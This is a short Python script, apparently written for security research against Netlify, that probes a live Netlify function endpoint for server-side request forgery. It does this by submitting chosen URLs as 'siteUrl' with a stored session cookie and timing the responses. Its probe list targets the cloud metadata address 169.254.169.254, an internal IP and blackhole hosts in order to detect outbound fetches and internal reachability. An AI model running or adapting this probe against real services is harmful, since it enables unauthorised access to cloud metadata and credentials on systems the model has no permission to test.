# -*- coding: utf-8 -*-
"""sdk-version siteUrl:计时侧信道判断是否真出站 fetch"""
import http.client, ssl, gzip, brotli, json, sys, time
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_B

ctx = ssl.create_default_context()

def req(cookie, path, method='POST', body=None, timeout=30):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Cookie': cookie, 'Content-Type': 'application/json'}
    payload = json.dumps(body).encode()
    t0 = time.time()
    try:
        conn.request(method, path, body=payload, headers=h)
        r = conn.getresponse()
        raw = r.read()
        enc = r.getheader('Content-Encoding')
        if enc == 'br':
            raw = brotli.decompress(raw)
        elif enc == 'gzip':
            raw = gzip.decompress(raw)
        st = r.status
        dt = time.time() - t0
        conn.close()
        return st, dt, raw
    except Exception as e:
        return 'ERR', time.time() - t0, str(e)[:60].encode()

# 出站判定探针
# - dns 黑洞: never.resolve.invalid → 若出站 DNS 会 ~5s 超时
# - 连接黑洞: 10.255.255.1:81 → 若出站 connect 会快速拒绝或超时
# - 正常站点: https://example.com
# - netlify 函数站点: 真 fetch 会 200/其他
# - 本地函数 URL(若真 fetch,将触发我们的函数执行)
probes = [
    ('valid https',      'https://example.com'),
    ('dns blackhole',    'https://never-exist-zzz.invalid/'),
    ('conn blackhole',   'http://10.255.255.1:81/'),
    ('imds',             'http://169.254.169.254/latest/meta-data/'),
    ('own fn probe9',    'https://sec-b-08v4pk.netlify.app/.netlify/functions/probe9?start=0&size=10'),
    ('own fn probe3',    'https://sec-b-08v4pk.netlify.app/.netlify/functions/probe3'),
    ('own site root',    'https://sec-b-08v4pk.netlify.app/'),
    ('netlify.com',      'https://www.netlify.com/'),
]
for label, u in probes:
    st, dt, raw = req(COOKIE_B, '/.netlify/functions/fetch-extension-host-site-sdk-version', 'POST', {'siteUrl': u}, timeout=40)
    print('%-18s %s  %6.1fs  %s' % (label, st, dt, raw[:120].decode('utf-8', 'replace').replace('\n', ' ')))
